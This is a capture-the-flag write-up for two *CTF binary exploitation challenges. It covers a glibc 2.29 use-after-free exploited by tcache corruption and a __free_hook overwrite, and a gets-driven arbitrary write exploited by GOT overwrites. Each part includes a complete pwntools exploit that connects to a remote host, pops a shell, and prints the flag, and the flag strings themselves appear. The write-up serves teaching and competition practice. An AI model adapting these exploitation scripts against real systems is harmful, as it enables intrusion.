## girlfriend

We have the following action permitted:

- Add a girl: we must fit the following struct, girlfriend{ char *name; dword size_name; char number[12]; }, by inserting the length of the name, the name and the number of the girl, then we save the pointer
  in a global var in bss, we can insert a maximux of 100 elements

- Show info: show her name and her phone number

- Edit info: not yet implemented because 'Programmer is tired, delete it and add a new info' xD

- Call that girl: select a girl to speak out your love! then you should have a random answer (as usual now i think), but before free also the girlfriend->name chunk. the struct girlfriend is not freed

- Exit

The vulnerability arises in the 'Call that girl' function,in fact there's a simply UAF, caused by not setting the girlfriend->name pointer to NULL.
```
  ...
  if ( index_girl < 0 || index_girl > 99 )
    exit(0);
  if ( array_of_girl[index_girl] )
    free(*array_of_girl[index_girl]);   // uaf and leak
  v0 = time(0LL);
  srand(v0);
  esito = rand() % 10;   //  2/10 ..damn you probability
  if ( esito > 1 )
    puts("Oh, you have been refused.");
  else   
    puts("Now she is your girl friend!");
  ...
```
The libc given for the challenge was the 2.29, so no double-free in tcachebins, but we can free the same chunk in another bins (e.g. fastbin).
The problem is that in this last case, the tcachebins has more priority than other bins, and so the same chunk is returned first by tcachebin,
and so we lose the tcache corrupt, to not lose this property, the solution i used was to have the same chunk with different size, in different bins. (consolidate etc.)

### Solution
 - fit the tcachebins[k], so now next freed chunk of size k will be put in unsortedbin (k > 0x80)
 - meanwhile, free and consolidate two chunks, e.g. we'll call them A and B, so them size will differ from k, but B should still have k as size
 - leak the arena
 - decrease the tcachebins[k] ,then free again B, this time no consolidate will happen because of tcache
 - tcache corrupt + _free_hook overwrite + system 
```
from pwn import *
import time

debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("34.92.96.238", 10001)
  libcz = ELF("./lib/libc.so.6")
  online=True
elif(debug == 1):
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  r =process( ['./lib/ld-2.29.so', '--library-path', './lib', './chall'])

def halt():
  while True:
    log.info( r.recvline() )

def add( length, name, nickname):
  r.recvuntil("choice:")
  r.sendline('1')
  r.recvuntil("girl's name")
  r.sendline( str(length) )
  r.recvuntil("her name:")
  r.sendline( name )
  r.recvuntil("call:")
  r.sendline( nickname )

def show( index ):
  r.recvuntil("choice:")
  r.sendline('2')
  r.recvuntil("index:")
  r.sendline( str(index) )

def edit(index):
  r.recvuntil("choice:")
  r.sendline('3')

def call_girl(index):
  r.recvuntil("choice:")
  r.sendline('4')
  r.recvuntil("index:")
  r.sendline(str(index))

def give_up():
  r.recvuntil("choice:")
  r.sendline('5')

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit():
 girls_till_now = 0
 add(0x18 -0x8, "A", "1") #0
 add(0x18 -0x8, "B", "2") #1
 call_girl(0)
 call_girl(1)
 add(0x90 -0x8, "consolidate", "1") #2
 #call_girl( girls_till_now )
 add(0x90 -0x8, "consolidate", "1") #3
 girls_till_now += 4

 for x in range(7):
  print("till now:{0}".format(x))
  add(0x90 - 0x8, "x", "1") #10
 for x in range(girls_till_now, girls_till_now + 7):
  call_girl(x)
 girls_till_now += 7
 add(0x18-0x8, "just lucky", "2") #11
 add(0x18-0x8, "just lucky", "2") #12
 call_girl( 11 )
 call_girl( 12 )

 # consolidate in unsorted
 call_girl( 2 ) #chunk A
 call_girl( 3 ) #chunk B
 add(0x90 - 0x8, "ok", "1")  #13
 call_girl(3)

 #leak
 show( 2 )
 r.recvuntil("name:"); r.recvline()
 leak_arena = u64(r.recvline().rstrip().ljust(8, "\x00"))
 log.info("leak heap 0x%x " % leak_arena)
 libc_base = (leak_arena - 0x3b1c40 - 0x60 )
 log.info("libc base 0x%x " % libc_base)
 free_hook = libc_base + 0x03b38c8
 one_gadget = libc_base + 0x41c30 #system instead

 add(0x120 - 0x8, "A"*0x90 + p64(free_hook), "1") #14
 add(0x90 -0x8, "cat flag\x00", "1") #15
 add(0x90 -0x8, p64(one_gadget)*0x2, "1") #16
 call_girl(15)
 interactive() #*CTF{pqyPl2seQzkX3r0YntKfOMF4i8agb56D}


exploit()
```


## quicksort

The program requires some integer as input, then it use quicksort to order them, buf before we must insert the length of the array, then malloc return a chunk.
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The vulnerability resides when we insert the integers, as we can see in the following lines:
```
.text:080488FD                 lea     eax, [ebp+s]    ; s=-0x2c
.text:08048900                 push    eax             ; s
.text:08048901                 call    _gets           ; out of bounds write 

  ....                         ....   ....

.text:08048913                 mov     eax, [ebp+array_of_numbers] ;array_of_number=-0x10
.text:08048916                 lea     ebx, [edx+eax] 
.text:08048919                 sub     esp, 0Ch
.text:0804891C                 lea     eax, [ebp+s]
.text:0804891F                 push    eax             ; nptr
.text:08048920                 call    _atoi
.text:08048925                 add     esp, 10h
.text:08048928                 mov     [ebx], eax      ; write something to somewhere
```
so if we craft the buffer 's', we can choose where to overwrite.

### Solution
Noting that we are able to write somewhere with atoi, and that in 32bit we can convert to max (2 ^ 31) - 1 as positive value, (libc base addr are greater).
We used got overwrite, by overwritting the free@got with the address of the main, so having a loop of the main,
then in the second iteration we also leaked the atoi@got, by crafting the buffer 's', so to change the counter of element inserted.

Now if we want to overwrite a got with the system (e.g. 0xf7decda0) we cannot do that in one step, but in two steps,
so this means that we cannot overwrite a got required in the next iteration by the main.

We selected the __stack_chk_fail@got, in fact we are lucky that below is the malloc@got, and this last has the least significant byte set to 0x00,
so now we can write 0x00decda0 in __stack_chk_fail@got, and then write 0x00f7decd in __stack_chk_fail@got+1.
```
from pwn import *
import time, ctypes

debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("34.92.96.238", 10000)
  libcz = ELF("./libc.so.6")
  online=True
elif(debug == 1):
  libcz = ELF("/lib/i386-linux-gnu/libc.so.6")
  mainz = ELF("./quicksort")
  r = mainz.process()
  online=False

def halt():
  while True:
    log.info( r.recvline() )

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def send_payload( offset, counter_1, counter_2, addr_special):
 r.recvuntil("to sort?")
 r.sendline("1")
 r.recvuntil("number:")
 payload = ""
 payload += (str(offset)).ljust(0x2c - 0x1c, "\x00")
 payload += p32( 1 )
 payload += p32( counter_1)
 payload += p32( counter_2)
 payload += p32( addr_special)
 r.sendline( payload )

def exploit():
 #main loop
 main_addr = 0x8048816
 free_got = 0x804a018
 send_payload( main_addr, 0, 1, free_got)

 #leak atoi
 atoi_got = 0x804a038
 send_payload( 0x1, 1, 0, atoi_got)
 r.recvuntil("Here"); r.recvline()
 leak_atoi = ctypes.c_ulong(int( r.recvline().rstrip() )).value & (2**32 -1)
 log.info("leak libc 0x%x" % leak_atoi)
 libc_base = ( online ) and ( leak_atoi - 0x0002d250) or ( leak_atoi - 0x0002d250)
 log.info("libc base addr 0x%x"% libc_base)

 one_gadget = online and (libc_base + 0x0003ada0 ) or (libc_base + 0x0003ada0) #system instead
 log.info("one gadget addr 0x%x"%  one_gadget)

 #shell
 stack_fail = 0x804a024
 stack_fail_plt = 0x8048540

 send_payload(( one_gadget & 0x00ffffff) , 0, 1, stack_fail )
 send_payload(((one_gadget & 0xffffff00 ) >> 8 )  , 0, 1, stack_fail+1 ) 
 send_payload( stack_fail_plt, 0, 1, atoi_got)

 r.recvuntil("to sort?")
 r.sendline("1")
 r.recvuntil("number:")
 r.sendline("cat flag\x00")
 interactive()# *CTF{lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX}

exploit()
```

